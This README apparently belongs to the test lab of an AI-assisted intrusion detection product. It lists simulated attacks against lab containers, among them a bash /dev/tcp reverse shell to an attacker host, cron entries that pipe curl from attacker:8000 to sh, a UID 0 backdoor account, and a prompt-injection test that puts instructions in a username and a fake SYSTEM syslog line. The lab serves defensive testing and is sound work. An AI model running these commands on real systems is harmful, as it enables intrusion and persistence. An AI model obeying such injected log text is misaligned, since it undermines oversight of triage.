# Aegis test lab

A local Linux target (two Ubuntu 24.04 containers running the Aegis agent), an attacker container, and scripts that simulate common intrusions. Use it to check the full loop: anomaly, incident, AI triage, tier-0 evidence, tier-1 approval, action executed on the container.

**Lab only.** The targets run privileged, with `alice:alice` and password SSH enabled. Do not expose these ports or reuse the credentials.

## Prerequisites

- Docker Desktop (Docker Compose v2.17 or newer) on macOS, or Docker Engine on Linux
- Go toolchain, for building the agent
- Node.js and `npx wrangler` (for the local server)
- Optional: `jq`, for reading the enrollment token

## 1. Build the agent

The agent is built from `agent/` into `agent/bin/` (gitignored). Pick the architecture of your Docker host:

```sh
make -C agent build-linux-arm64   # Apple Silicon
make -C agent build-linux-amd64   # Intel Mac or Linux x86_64
```

This produces `agent/bin/aegis-agent-linux-arm64` or `agent/bin/aegis-agent-linux-amd64`. Compose bind-mounts that file read-only into each target. Rebuild the agent and then `docker compose ... restart target1 target2` to pick up changes. You do not need to rebuild the image.

## 2. Signing key and local server

The server signs commands and policy with an Ed25519 key, stored as a Worker secret. For local dev, put it in `server/.dev.vars` (gitignored). Generate it once:

```sh
cd /Users/eve/aegis/server
[ -f .dev.vars ] || { node scripts/gen-signing-key.mjs > .dev.vars; echo 'DEV_MODE=true' >> .dev.vars; }
```

Apply the local D1 migrations, then start the server. `--ip 0.0.0.0` is required. Without it, `wrangler dev` listens only on 127.0.0.1, and the containers reach the host through `host.docker.internal`, so they cannot connect.

```sh
cd /Users/eve/aegis/server
npx wrangler d1 migrations apply aegis --local
npx wrangler dev --ip 0.0.0.0 --port 8787
```

With `DEV_MODE=true`, the console API accepts requests as `dev@local` and needs no Cloudflare Access JWT.

## 3. Create enrollment tokens

Each target enrolls once. Tokens are one-time and expire after their TTL, so create one per target:

```sh
TOKEN1=$(curl -s -X POST http://localhost:8787/console/api/enroll-tokens \
  -H 'Content-Type: application/json' -d '{"ttl_hours":4}' | jq -r .token)
TOKEN2=$(curl -s -X POST http://localhost:8787/console/api/enroll-tokens \
  -H 'Content-Type: application/json' -d '{"ttl_hours":4}' | jq -r .token)
```

Without `jq`, copy the `token` field from the JSON response.

## 4. Start the lab

From the repo root:

```sh
AEGIS_ARCH=arm64 \
AEGIS_TOKEN_TARGET1="$TOKEN1" AEGIS_TOKEN_TARGET2="$TOKEN2" \
  docker compose -f lab/docker-compose.yml up -d --build
docker compose -f lab/docker-compose.yml logs -f target1
```

`AEGIS_ARCH` must match the binary from step 1 (`amd64` on Intel). Expected log lines from `target1`:

```
[lab-entrypoint] sshd started
[lab-entrypoint] auditd running, audit rules loaded   (or a WARN line, see Troubleshooting)
[lab-entrypoint] enrolling with http://host.docker.internal:8787
[lab-entrypoint] starting agent
```

In the dashboard, `target1` and `target2` should appear as online hosts. Restarting the containers does not need new tokens, because the agent key is stored in the `target1-state` and `target2-state` volumes. `docker compose ... down -v` deletes those volumes, so you need new tokens after that.

Check the containers:

```sh
docker compose -f lab/docker-compose.yml ps
docker compose -f lab/docker-compose.yml exec target1 nft list ruleset   # nftables reachable?
```

## 5. Run the attacks

Each script in `lab/attacks/` is idempotent and runs from the host. It dispatches commands into the containers with `docker compose exec`.

| Script | What it does |
|---|---|
| `01-ssh-bruteforce.sh` | 30 failed SSH logins for `alice` from the attacker, then one correct login |
| `02-new-uid0-user.sh` | Creates `backdoor` with UID 0 on target1 |
| `03-tmp-binary.sh` | Copies `/bin/sleep` to `/tmp/.x` and runs it in the background |
| `04-reverse-shell.sh` | Listener on attacker:4444, then `bash -i >& /dev/tcp/attacker/4444 0>&1` on target1 (lifetime `REVSHELL_TIMEOUT`, default 180s) |
| `05-cron-persistence.sh` | Root crontab entry and `/etc/cron.d/aegis-lab-persist`, both `curl \| sh` every minute |
| `06-authorized-keys.sh` | Appends a generated key to `/root/.ssh/authorized_keys` |
| `07-curl-pipe-sh.sh` | Serves a harmless script from the attacker and runs `curl \| sh` on target1 |
| `08-prompt-injection.sh` | Failed login with an instruction as the username, and a syslog line claiming to be SYSTEM |

Run one at a time, which is the easiest way to watch each detection:

```sh
lab/attacks/01-ssh-bruteforce.sh
```

Or run all of them with a pause between each:

```sh
PAUSE=60 lab/attacks/run-all.sh
```

Attack 05 and 07 are linked. The cron entries fetch `http://attacker:8000/x.sh`, which only exists after 07 has started the payload server. Run 07 before 05 if you want to avoid cron errors every minute.

## 6. What to expect in the dashboard

The flow for each attack is: anomaly, incident (deduplicated by fingerprint), AI triage (`ai_review`), tier-0 evidence auto-collected, then tier-1 actions queued for approval under `propose_only` or `autonomous` mode. Setting autonomy to `paused` stops all AI actions. Use it to check the gate.

Action names below come from PROTOCOL.md section 5. Whether the AI proposes a given action depends on the model's judgement, so "may propose" means the case is expected but not guaranteed.

## 7. Verify actions took effect inside the container

Approve a tier-1 action in the dashboard, then check the container directly.

| Action | Check |
|---|---|
| `block_ip` | `docker compose -f lab/docker-compose.yml exec target1 nft list ruleset`. Look for `table inet aegis`, set `blocked` (IPv4) / `blocked6` (IPv6). The attacker's IP (usually on the compose network) should appear, and it should be removed after `rollback`. |
| `kill_process` (03) | `docker compose -f lab/docker-compose.yml exec target1 sh -c 'cat /tmp/.x.pid; ps -eo pid,comm,args \| grep "[.]x"'`. The PID from the pidfile should be gone after approval. |
| `kill_process` (04) | `docker compose -f lab/docker-compose.yml exec target1 ps -eo pid,args \| grep "[d]ev/tcp\|[t]imeout"`. Killing the shell should close the connection, and the attacker's nc output file stops growing. |
| `quarantine_file` (05/06/07) | `docker compose -f lab/docker-compose.yml exec target1 ls -l /var/lib/aegis`. The quarantine path comes back in the action result. The original file should be gone. |
| `disable_user` (02) | The agent must refuse it, because it never acts on uid 0. Check `docker compose ... exec target1 id backdoor` (still present) and the rejection in the audit log. |
| `isolate_host` | From target1, `curl -m 3 http://attacker:8000/` fails, and `curl -m 3 http://host.docker.internal:8787/console/api/me` still works. |

Also check the audit log in the dashboard for every approve, reject, and rollback entry. Each should appear with its `rollback_token` where one applies.

## 8. Expected detections

Rule names below are the intended targets, not confirmed IDs. Check the **Rules** view in the dashboard for the actual rule IDs. Sigma rule names come from the SigmaHQ pack once it is synced, and they have not been verified against it here.

| # | Attack | ATT&CK | Expected detection | Expected follow-up (may propose) |
|---|---|---|---|---|
| 01 | SSH brute force, then success | T1110.001 Password Guessing | `native:ssh_bruteforce` (threshold `native:ssh_bruteforce.count` / `.window_s` in policy), then `native:ssh_success_after_failures` | `block_ip` for the attacker (tier 1) |
| 02 | UID 0 backdoor account | T1136.001 Create Account: Local Account | Sigma *Local Account Created or Modified With UID 0* (`e5275bd0-…`) + `native:user_new` + `native:fim_change` on `/etc/passwd` | `disable_user` for `backdoor` is refused by the agent (uid 0 guard). Verify the refusal. |
| 03 | Hidden binary run from `/tmp` | T1036.005, T1564.001 | Sigma *Execution of Binary from Temporary or Shared-Memory Directory* (`c70d2d80-…`) + `native:proc_exec_from_tmp` | `kill_process` for the PID in `/tmp/.x.pid` (tier 1) |
| 04 | Bash reverse shell | T1059.004, T1571 | Sigma *Reverse Shell via Bash /dev/tcp Redirection* (`8ff84061-…`) + `native:proc_reverse_shell` (socket on stdin/stdout) | `kill_process` for the shell, `block_ip` for the attacker |
| 05 | Cron persistence | T1053.003 Cron | Sigma *Cron Job or Crontab File Modified* (`86070714-…`); when cron fires, *Download and Pipe to Shell* (`d3682239-…`) | `quarantine_file` for `/etc/cron.d/aegis-lab-persist` (tier 1) |
| 06 | `authorized_keys` change | T1098.004 SSH Authorized Keys | Sigma *SSH authorized_keys File Modified* (`8aba1dfe-…`; supersedes the duplicate `native:fim_change`) | Collect evidence (`file_sample`). No action in the vocabulary removes a single key, so the expected outcome is a recommendation, or `quarantine_file` of the file (tier 1). |
| 07 | `curl \| sh` | T1105, T1059.004 | Sigma *Download and Pipe to Shell via curl or wget* (`d3682239-…`); SigmaHQ's `proc_creation_lnx_susp_curl_pipe_bash` too if that pack is promoted from shadow; possibly `native:rare_outbound` | `block_ip` for the attacker |
| 08 | Prompt injection in username and log | none (guardrail) | Failed login anomaly from 01-style rules. The injected text must not change triage. | None. The gate must reject any `suppress`, `disable_rule`, or `promote_rule` attempt, and the attempt is recorded in the audit log. |

## 9. Cleanup

```sh
lab/attacks/cleanup.sh
```

This reverts the artifacts that the scripts created on the targets: the backdoor account, `/tmp/.x`, the cron entries, the added `authorized_keys` line, and any reverse shells. It does not roll back agent actions such as blocked IPs or quarantined files, so use the dashboard rollback for those. It also does not reset agent enrollment.

Full reset (containers, agent state, and the enrollment volumes):

```sh
docker compose -f lab/docker-compose.yml down -v
```

Stop the server with Ctrl-C in the `wrangler dev` terminal.

## Troubleshooting

- **`agent binary ... is missing`** in the target logs: the build step (1) did not run, or `AEGIS_ARCH` does not match the file name. Check `ls agent/bin/`.
- **Container will not start with a bind mount error**: the same cause. `create_host_path: false` is deliberate, so Docker does not create an empty directory in its place.
- **Enrollment fails with a connection error**: the target cannot reach `host.docker.internal:8787`. Confirm that `wrangler dev` was started with `--ip 0.0.0.0`. Docker Desktop on macOS needs the `host-gateway` mapping from compose, which is already set.
- **`not enrolled and AEGIS_TOKEN is empty`**: the token variable is not set, or the volume already holds an agent key from an earlier run. Use `down -v` to start from scratch, or ignore the message if the agent is already enrolled.
- **auditd WARN lines**: Docker Desktop's Linux VM often has no kernel audit access. The lab still runs. Auditd-based rules will be missing, and the agent should fall back to its other collectors.
- **`nft` errors**: the Docker host kernel needs nf_tables. `NET_ADMIN` and privileged mode are set in compose. If `nft list ruleset` still fails, the host kernel is the cause, not the lab.
- **Reverse shell or payload server does nothing**: check `docker compose ... exec attacker ps -ef` and `/tmp/aegis-http.log` and `/tmp/aegis-revshell.txt` on the attacker.
